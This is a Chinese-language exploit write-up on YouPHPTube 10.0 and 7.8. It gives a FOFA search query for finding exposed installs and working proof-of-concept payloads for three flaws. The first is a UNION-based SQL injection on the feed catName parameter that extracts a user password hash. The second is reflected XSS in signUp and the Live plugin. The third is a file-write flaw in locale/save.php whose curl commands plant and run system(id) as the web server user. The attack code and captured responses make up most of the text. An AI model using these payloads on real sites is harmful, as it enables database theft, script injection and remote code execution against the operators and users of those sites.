# YouPHPTube <= 10.0 and 7.8 多个漏洞 SQL注入、XSS、文件写入


YouPHPTube是一个开源的视频共享网站应用。使用YouPHPTube，用户可以创建自己的视频共享网站，YouPHPTube 将帮助用户导入和编码来自Youtube，Vimeo 等其他网站的视频，用户可以直接在自己的网站上进行分享。

除了XSS  其它都需要进行身份验证...文件写入需要管理员权限..

**FOFA：**

```
app="AVideo-YouPHPTube"
```

**1.sql注入：**

漏洞代码：

```sql
$sql .= " AND (c.clean_name = '{$_GET['catName']}' OR c.parentId IN (SELECT cs.id from
categories cs where cs.clean_name = '{$_GET['catName']}' ))";
```

**PoC：**

```
GET /feed/?catName=%5c HTTP/1.1
[...]
```

10.0版本：

```bash
GET /feed/?catName=)
+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
,30,31,
(select+password+from+users+limit+0,1),33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,5
0,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78%23%5c
3/6
HTTP/1.1
[...]
HTTP/1.1 200 OK
[…]
<title>756b4b2b734f5568096daf16516975d7</title>
[…]
```

7.8版本：

```sql
GET /youphptube/YouPHPTube-master/feed/?catName=)
+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
,30,
(select+password+from+users+limit+0,1),32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,4
9,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73%23%5c HTTP/1.1
[…]
HTTP/1.1 200 OK
[…]
<title>756b4b2b734f5568096daf16516975d7</title>
[…]
```

**2.XSS跨站脚本**

漏洞代码：

```
print isset($_GET['redirectUri']) ? $_GET['redirectUri'] : "";
```

**PoC：**

```
http://<target>/signUp?redirectUri=%22%3E%3Cscript%3Ealert(111)%3C%2fscript%3E
```

```
http://<target>/plugin/Live/?u=%3Cscript%3Ealert(66)%3C%2fscript%3E
```


**3.文件写入导致的代码执行：**

漏洞代码：

```php
$file = $dir.strtolower($_POST['flag']).".php";
$myfile = fopen($file, "w") or die("Unable to open file!");
if (!$myfile) {
 $obj->status = 0;
 $obj->error = __("Unable to open file!");
 die(json_encode($obj));
}
$txt = "<?php\nglobal \$t;\n";
fwrite($myfile, $txt);
fwrite($myfile, $_POST['code']);
fclose($myfile);
echo json_encode($obj);
```

**PoC：**

```bash
$ curl -kis 'http://<target>/locale/save.php' -H 'Cookie:09b9117edc20bc1c555739155c0eb1bd=9jpn05830lp2f7s9atqbs9kbc1;' --data 'flag=testfile2&code=system(id);'

$ curl -kis 'http://<target>/locale/testfile2.php' -H 'Cookie:09b9117edc20bc1c555739155c0eb1bd=9jpn05830lp2f7s9atqbs9kbc1;'

HTTP/1.1 200 OK
Date: Sat, 21 Nov 2020 05:20:55 GMT
Server: Apache
X-Powered-By: PHP/7.4.11
Cache-Control: max-age=1, private, must-revalidate
Expires: Sat, 21 Nov 2020 05:20:56 GMT
Content-Length: 49
Content-Type: text/html; charset=UTF-8

uid=81(apache) gid=81(apache) groupes=81(apache)
```

ref:

* https://www.synacktiv.com/sites/default/files/2021-01/YouPHPTube_Multiple_Vulnerabilities.pdf
* https://forum.ywhack.com/thread-115063-1-1.html